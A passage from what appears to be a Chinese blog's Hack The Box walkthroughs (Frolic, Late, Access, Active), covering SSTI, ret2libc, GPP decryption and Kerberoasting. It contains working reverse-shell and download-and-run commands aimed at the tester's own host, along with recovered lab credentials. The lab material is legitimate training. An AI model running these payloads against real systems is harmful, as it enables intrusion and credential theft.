0\naW1wb3J0IHN0cnVjdAoKYnVmID0gIkEiICogNTIKbGliYyA9IDB4YjdlMTkwMDAKc3lzdGVtID0gc3RydWN0LnBhY2soJzxJJywgbGliYyArIDB4MDAwM2FkYTApCmV4aXQgPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAyZTlkMCkKYmluc2ggPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDE1YmEwYikKCnBheWxvYWQgPSBidWYgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ=\n```\n把脚本转换为 base64 然后到靶机里再解码出来存储\n\n```bash\nprint payloadwww-data@frolic:~/html/playsms$ echo -n aW1wb3J0IHN0cnVjdAoKYnVmID0gIkEiICogNTIKbGliYyA9IDB4YjdlMTkwMDAKc3lzdGVtID0gc3RydWN0LnBhY2soJzxJJywgbGliYyArIDB4MDAwM2FkYTApCmV4aXQgPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAyZTlkMCkKYmluc2ggPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDE1YmEwYikKCnBheWxvYWQgPSBidWYgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= | base64 -d > exploit.py\n<W0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= | base64 -d > exploit.py\n```\n输出成 exploit.py 了\n\n```bash\n./rop $(python /var/www/html/playsms/exploit.py)\n```\n使用 rop 去执行我们的 exploit\n\n```bash\n# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=33(www-data) groups=33(www-data)\n```\n成功提权到 root 权限\n\n```bash\ncat root.txt\n85d3fdf03f969892538ba9a731826222\n```\n成功获得 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Late - Hackthebox","url":"/2022/04/25/Hackthebox/Easy/Hackthebox-Late/","content":"\n# Hackthebox - Late\n# 靶场信息\n![](Hackthebox-Late/3c0da694-38ec-46aa-b528-8a76ed08d5f8.png)\n\n# 靶场类型\n![](Hackthebox-Late/74e589ab-4eec-40b4-aa8e-26bee14ef804.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.156\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-23 21:42 EDT\nNmap scan report for 10.10.11.156\nHost is up (0.36s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)\n|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)\n|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n|_http-title: Late - Best online image tools\nAggressive OS guesses: Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Linux 3.10 (92%), Linux 5.3 - 5.4 (92%), Linux 2.6.32 (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   385.69 ms 10.10.14.1\n2   385.83 ms 10.10.11.156\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.86 seconds\n```\n## Http\n![](Hackthebox-Late/33b2f7ae-8b61-466d-a254-1c1fcb198b4a.png)\n\n这似乎是一个图像编辑器的网站，到处看看有没有什么线索\n\n![](Hackthebox-Late/ed3c5988-f75b-4f0a-861e-b020b5178288.png)\n\n在这里找到一个链接\n\n[http://images.late.htb/](http://images.late.htb/)\n\n我们去加入一个 hosts\n\n```bash\necho 10.10.11.156 late.htb images.late.htb >> /etc/hosts\n```\n然后再访问一下\n\n![](Hackthebox-Late/ffec8f85-e280-4579-a205-d2b4eefbd141.png)\n\n这里似乎是上传图片，然后会扫描图片，先随便传一个试试看\n\n![](Hackthebox-Late/6b9f01c5-52e6-4923-b9a8-655ec090ba70.jpeg)\n\n我将上面这张纯黑色的图片上传上去提交以后，给了我一个文件 results.txt\n\n```bash\n<p></p>\n```\n我不太理解是做了什么，之后去搜索了一下\n\n![](Hackthebox-Late/7f0b3c3a-7379-47c1-9ffe-077ba415195d.png)\n\n> [https://www.geeksforgeeks.org/python-convert-image-to-text-and-then-to-speech/](https://www.geeksforgeeks.org/python-convert-image-to-text-and-then-to-speech/)\n\n似乎意思是会把图片里的文字使用OCR识别，然后输出出来，上传一张带文字的图片试试\n\n![](Hackthebox-Late/c7b76aaa-50b6-449b-b28d-5580284876cb.png)\n\n去上传一下\n\n```bash\n<p>This is the first line of\nthis text example.\n\nThis is the second line\nof the same text.\n</p>\n```\n果然如此，去尝试一下上传一些恶意文件试试\n\n```bash\n<p>whoami\n</p>\n```\n我上传了一张带有 whoami 的图片，识别出来后没有执行，咱们试试把  标签给闭环试试\n\n```bash\n<p></p>whoami<p>\n</p>\n```\n闭环失败，重新构造一下其他语句\n\n我们尝试一下 SSTI\n\n![](Hackthebox-Late/cd982019-506e-44c8-a419-bc43116c027e.png)\n\n```bash\n<p>S81\n</p>\n```\n得到了正确答案\n\n# 漏洞利用\n那尝试构造一下是否可以执行命令\n\n```bash\n${{request.application._ _globals_ _._ _builtins_ _._ _import_ _(\"os\").popen(\"whoami\").read()}}\n```\n![](Hackthebox-Late/c3ba63ca-08aa-46f9-b971-560bfce4366f.png)\n\n```bash\n<p>$svc_acc\n\n</p>\n```\n执行成功，这个 OCR 识别的条件非常苛刻，我尝试了很多很多字体，总算成了一个\n\n想办法来做一个反弹 Shell 的 payload\n\n首先我们生成我们要的图片\n\n```bash\n${{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"curl http://10.10.14.9/payload | bash\").read()}}\n```\n![](Hackthebox-Late/4601fbb3-4f55-47fe-a279-ec066bf4d0d4.png)\n\n接着在桌面创建一个 payload 文件，内容为\n\n```bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.9 4444 >/tmp/f\n```\n接着咱们需要开两个命令窗口\n\nCommand 1\n\n```bash\npython3 -m http.server 80\n```\nCommand 2\n\n```bash\nnc -nvlp 4444\n```\n然后上传我们的 Payload\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.11.156] 58240\nbash: cannot set terminal process group (1213): Inappropriate ioctl for device\nbash: no job control in this shell\nsvc_acc@late:~/app$ whoami&&id\nwhoami&&id\nsvc_acc\nuid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)\n```\n成功拿到一个 user 权限的 shell\n\n```bash\nsvc_acc@late:~$ cat user.txt\ncat user.txt\naf80a52c1f6ce51724a56a589a96ce20\n```\n成功拿到一个 user 权限的 flag 文件\n\n# 权限提升\n首先运行一下 pspy\n\n> [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)\n\n![](Hackthebox-Late/91c6fc8a-2215-43f1-ba34-bed4480ea2f5.png)\n\n这里找到了一个定时任务脚本\n\n```bash\n/usr/local/sbin/ssh-alert.sh\n```\n```bash\n#!/bin/bash\n\nRECIPIENT=\"root@late.htb\"\nSUBJECT=\"Email from Server Login: SSH Alert\"\n\nBODY=\"\nA SSH login was detected.\n\n        User:        $PAM_USER\n        User IP Host: $PAM_RHOST\n        Service:     $PAM_SERVICE\n        TTY:         $PAM_TTY\n        Date:        `date`\n        Server:      `uname -a`\n\"\n\nif [ ${PAM_TYPE} = \"open_session\" ]; then\n        echo \"Subject:${SUBJECT} ${BODY}\" | /usr/sbin/sendmail ${RECIPIENT}\nfi\n```\n这是脚本的内容，咱们分析一下\n\n```bash\nsvc_acc@late:~$ ls -la /usr/local/sbin/ssh-alert.sh\n-rwxr-xr-x 1 svc_acc svc_acc 433 Apr 24 07:16 /usr/local/sbin/ssh-alert.sh\nsvc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh\n-----a--------e--- /usr/local/sbin/ssh-alert.sh\n```\n这里查看权限，咱们是可以将内容写到进去的\n\n```bash\necho \"chmod u+s /bin/bash\" >> /usr/local/sbin/ssh-alert.sh\n```\n咱们加一个 bash SUID，然后重新登录 ssh，接着执行提权命令\n\n```bash\nsvc_acc@late:~$ echo \"chmod u+s /bin/bash\" >> /usr/local/sbin/ssh-alert.sh\nsvc_acc@late:~$ exit\nlogout\nConnection to 10.10.11.156 closed.\n\n┌──(root💀kali)-[~/Desktop]\n└─# ssh svc_acc@10.10.11.156 -i id_rsa\n-bash-4.4$ id\nuid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)\n-bash-4.4$ bash -p\nbash-4.4# id\nuid=1000(svc_acc) gid=1000(svc_acc) euid=0(root) groups=1000(svc_acc)\n```\n成功拿到 root 权限\n\n```bash\nbash-4.4# cat /root/root.txt \n7af076bfa316a1091b3139a231ac7d1e\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Access - Hackthebox","url":"/2022/04/24/Hackthebox/Easy/Hackthebox-Access/","content":"\n# Hackthebox - Access\n\n# 靶场信息\n\n![](Hackthebox-Access/c3023160-dbeb-4968-bb82-dc3dbb973934.png)\n\n# 靶场类型\n\n![](Hackthebox-Access/a47fb898-9304-46fb-87e6-6e87090a8865.png)\n\n# 信息收集\n\n## Nmap\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.98 \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-24 22:29 EDT\nNmap scan report for 10.10.10.98\nHost is up (0.34s latency).\nNot shown: 65532 filtered ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n23/tcp open  telnet?\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: MegaCorp\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)\nOS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012\nAggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 23/tcp)\nHOP RTT       ADDRESS\n1   338.15 ms 10.10.14.1\n2   338.30 ms 10.10.10.98\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 89.52 seconds\n```\n\n这里有个 ftp，使用匿名用户查看\n\n## FTP\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ftp 10.10.10.98                                                                                                         \nConnected to 10.10.10.98.\n220 Microsoft FTP Service\nName (10.10.10.98:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\n```\n\n登入后有两个文件夹\n\n```bash\nftp> ls\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-23-18  09:16PM       <DIR>          Backups\n08-24-18  10:00PM       <DIR>          Engineer\n226 Transfer complete.\n```\n\nBackups 和 Engineer 里分别有一个文件\n\n```bash\nftp> ls backups\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-23-18  09:16PM              5652480 backup.mdb\n226 Transfer complete.\n```\n\n```bash\nftp> ls engineer\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-24-18  01:16AM                10870 Access Control.zip\n226 Transfer complete.\n```\n\n使用 get 给它下载下来，backup.mdb 比较大，多等待一下\n\n去查看一下 backup.mdb 的文件\n\n# 漏洞利用\n\n## Zip\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# strings backup.mdb|grep access\naccess4u@security\n```\n\n我们找到了一个密码，应该是解压密码，去尝试解压一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ls Access\\ Control.pst                                                              2 ⨯\n'Access Control.pst'\n```\n\n解压成功\n\n## PST\n\n使用 readpst 来提取文件\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# readpst Access\\ Control.pst \nOpening PST file and indexes...\nProcessing Folder \"Deleted Items\"\n        \"Access Control\" - 2 items done, 0 items skipped.\n```\n\n然后查看一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat Access\\ Control.mbox\n\nThe password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.\n```\n\n在里面找到一个密码\n\n```bash\nusername = security\npassword = 4Cc3ssC0ntr0ller\n```\n\n去尝试登录 23 端口\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# telnet 10.10.10.98                                \nTrying 10.10.10.98...\nConnected to 10.10.10.98.\nEscape character is '^]'.\nWelcome to Microsoft Telnet Service \n\nlogin: security\npassword: \n\n*===============================================================\nMicrosoft Telnet Server.\n*===============================================================\nC:\\Users\\security>whoami\naccess\\security\n```\n\n成功拿到一个 user 权限的 shell\n\n```bash\nC:\\Users\\security\\Desktop>type user.txt\nff1f3b48913b213a31ff6756d2553d38\n```\n\n成功得到一个 user 权限的 flag 文件\n\n# 权限提升\n\n```bash\nC:\\Users\\security>powershell whoami\naccess\\security\n```\n\n确认 powershell 存在并可执行命令\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cp /opt/shells/Invoke-PowerShellTcp.ps1 nishang.ps1\n```\n\n我们使用 nishang 来进行提权\n\n使用 python3 开启一个 http 服务\n\n```bash\npython3 -m http.server 80\n```\n\n```bash\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444\n```\n\n将上面这句代码添加到 nishang 最后一行，然后使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n\n```bash\npowershell \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.9/nishang.ps1')\"\n```\n\n然后执行\n\n```bash\nPS C:\\Users\\security>whoami\naccess\\security\n```\n\n现在我们得到了一个交互式 shell 了，其实这一步可以不做，不过我喜欢在 shell 内输入命令，而不能使用删除键就很难受\n\n> [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)\n\n接着我们使用 JAWS 来进行枚举\n\n```bash\npowershell \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.9/jaws-enum.ps1')\"\n```\n\n```bash\ncmd.exe                   764 security /q /k C:\\Windows\\system32\\login.cmd\n```\n\n这里看到了一个有趣的东西，我们可以去看看这是什么\n\n```bash\nC:\\Users\\security>type C:\\Windows\\system32\\login.cmd\n@echo off\nrem\nrem  Default global login script for the Telnet Server\nrem\nrem  In the default setup, this command script is executed when the\nrem  initial command shell is invoked.  It, in turn, will try to invoke\nrem  the individual user's login script.\nrem\n\necho *===============================================================\necho Microsoft Telnet Server.\necho *===============================================================\n\ncd /d %HOMEDRIVE%\\%HOMEPATH%\n```\n\n这是脚本的内容\n\n```bash\nC:\\Users\\security>cmdkey /list\n\nCurrently stored credentials:\n\n    Target: Domain:interactive=ACCESS\\Administrator\n                                                       Type: Domain Password\n    User: ACCESS\\Administrator\n```\n\n使用 cmdkey /list 找到了存储的登录凭证\n\n```bash\nPS C:\\Users\\Public\\Desktop>dir\n\n    Directory: C:\\Users\\Public\\Desktop\n\nMode                LastWriteTime     Length Name                                                                                                                                                                  \n----                -------------     ------ ----                                                                                                                                                                  \n-a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk\n```\n\n在 public 用户的桌面发现了一个快捷方式文件，查看一下\n\n```bash\nPS C:\\Users\\Public\\Desktop> type \"ZKAccess3.5 Security System.lnk\"\nL?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\\R1M?:Windows???:?▒M?:*wWindowsV1MV?System32???:?▒MV?*?System32▒X2P?:?\n                                                                                                           runas.exe???:1??:1?*Yrunas.exe▒L-K??E?C:\\Windows\\System32\\runas.exe#..\\..\\..\\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred \"C:\\ZKTeco\\ZKAccess3.5\\Access.exe\"'C:\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%?\n                       ?wN?▒?]N?D.??Q???`?Xaccess?_???8{E?3\n                                                           O?j)?H???\n                                                                    )??[?_???8{E?3\n                                                                                  O?j)?H???\n                                                                                           )??[?        ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500\n```\n\n可以看到这一行\n\n```bash\n\\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred \"C:\\ZKTeco\\ZKAccess3.5\\Access.exe\"\n```\n\n这里的意思是 可以使用 administrator 权限运行 access.exe 文件，我们把后面的 access.exe 文件换成我们自己的命令，那不就可以提权了？\n\n我们把这里的 access.exe 换成我们的 nishang\n\n```bash\nrunas /user:ACCESS\\Administrator /savecred \"powershell iex(new-object net.webclient).downloadstring('http://10.10.14.9/nishang.ps1')\"\n```\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                                                                                                                                                                                               1 ⨯\nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.98] 49166\nWindows PowerShell running as user Administrator on ACCESS\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32>whoami\naccess\\administrator\n```\n\n成功拿到 administrator 权限的 shell\n\n```bash\nPS C:\\users\\administrator\\desktop> type root.txt\n6e1586cc7ab230a8d297e8f933d904cf\n```\n\n成功拿到 root 权限的 flag 文件\n","tags":["Hackthebox"]},{"title":"Active - Hackthebox","url":"/2022/04/24/Hackthebox/Easy/Hackthebox-Active/","content":"\n# Hackthebox - Active\n\n# 靶场信息\n![](Hackthebox-Active/a289e434-5250-48bb-bf76-746fc219f445.png)\n\n# 靶场类型\n![](Hackthebox-Active/69c80c61-a7ea-4908-907b-9e855792b26f.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.100\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-22 02:56 EDT\nNmap scan report for 10.10.10.100\nHost is up (0.32s latency).\nNot shown: 65513 closed ports\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-22 06:57:01Z)\n135/tcp   open  msrpc?\n139/tcp   open  netbios-ssn?\n389/tcp   open  tcpwrapped\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5722/tcp  open  msdfsr?\n9389/tcp  open  mc-nmf        .NET Message Framing\n49152/tcp open  unknown\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  unknown\n49155/tcp open  tcpwrapped\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  tcpwrapped\n49165/tcp open  msrpc         Microsoft Windows RPC\n49170/tcp open  unknown\n49171/tcp open  unknown\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port139-TCP:V=7.91%I=7%D=4/22%Time=626251C0%P=x86_64-pc-linux-gnu%r(Get\nSF:Request,5,\"\\x83\\0\\0\\x01\\x8f\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/22%OT=53%CT=1%CU=38032%PV=Y%DS=2%DC=T%G=Y%TM=6262527\nOS:A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=I%TS=7)SEQ(SP=1\nOS:05%GCD=1%ISR=10D%TI=I%CI=RD%II=I%SS=O%TS=7)SEQ(SP=105%GCD=1%ISR=10E%TI=R\nOS:D%CI=I%II=I%TS=A)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M5\nOS:05NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000\nOS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF\nOS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%\nOS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A\nOS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y\nOS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR\nOS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU\nOS:D=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows                                                                                                     \n\nHost script results:\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-04-22T06:58:32\n|_  start_date: 2022-04-22T06:55:19\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT       ADDRESS\n1   316.49 ms 10.10.14.1\n2   316.60 ms 10.10.10.100\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 216.91 seconds\n```\n## Smb\n这里看到有 smb，去查看一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# smbmap -H 10.10.10.100                  \n[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                  \n        Disk                                           Permissions     Comment\n        ----                                           -----------     -------\n        ADMIN$                                         NO ACCESS       Remote Admin\n        C$                                             NO ACCESS       Default shar\n        IPC$                                           NO ACCESS       Remote IPC\n        NETLOGON                                       NO ACCESS       Logon server\n        Replication                                    READ ONLY\n        SYSVOL                                         NO ACCESS       Logon server\n        Users                                          NO ACCESS\n```\n这里有一个 Replication 目录是可以查看的，去看一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# smbclient //10.10.10.100/Replication    \nEnter WORKGROUP\\root's password: \nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Sat Jul 21 06:37:44 2018\n  ..                                  D        0  Sat Jul 21 06:37:44 2018\n  active.htb                          D        0  Sat Jul 21 06:37:44 2018\n\n                5217023 blocks of size 4096. 249292 blocks available\n```\n有个 active.htb 文件夹，给下载下来\n\n```bash\nrecurse ON\nprompt OFF\nmget *\n```\n```bash\nactive.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml\n```\n在上面这个文件中找到了一个账号和密码\n\n```bash\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"><User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"><Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/></User>\n</Groups>\n```\n```bash\nusername = active.htb\\SVC_TGS\ncpassword = edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVm\n```\n# 漏洞利用\n使用 kali 自带的 gpp-decrypt 进行解密\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\nGPPstillStandingStrong2k18\n```\n```bash\nusername = SVC_TGS\npassword = GPPstillStandingStrong2k18\n```\n现在我们有了账号密码，继续去 smb 里查看文件\n\n```bash\nsmbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18\n```\n```bash\nsmb: \\> dir\n  .                                  DR        0  Sat Jul 21 10:39:20 2018\n  ..                                 DR        0  Sat Jul 21 10:39:20 2018\n  Administrator                       D        0  Mon Jul 16 06:14:21 2018\n  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009\n  Default                           DHR        0  Tue Jul 14 02:38:21 2009\n  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009\n  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009\n  Public                             DR        0  Tue Jul 14 00:57:55 2009\n  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018\n\n                5217023 blocks of size 4096. 279115 blocks available\n```\n似乎直接就进系统了，去找找看有没有有价值的文件\n\n```bash\ncd SVC_TGS\\Desktop\\\nget user.txt\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat user.txt   \na8644850ef3290ae34457a8ad9982d5e\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n这台机器的 88 端口运行着 k8s(kerberos)，咱们可以用 impacket 来进行利用\n\n> [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)\n\n接着把这台靶机加入到 hosts里\n\n```bash\necho 10.10.10.100 active.htb >> /etc/hosts\n```\n然后使用这个工具\n\n```bash\npython3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18\n```\n```bash\n┌──(root💀kali)-[~/Desktop/impacket/examples]\n└─# python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18\nImpacket v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation\n\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation \n--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-04-22 02:56:29.468554             \n\n[-] CCache file is not found. 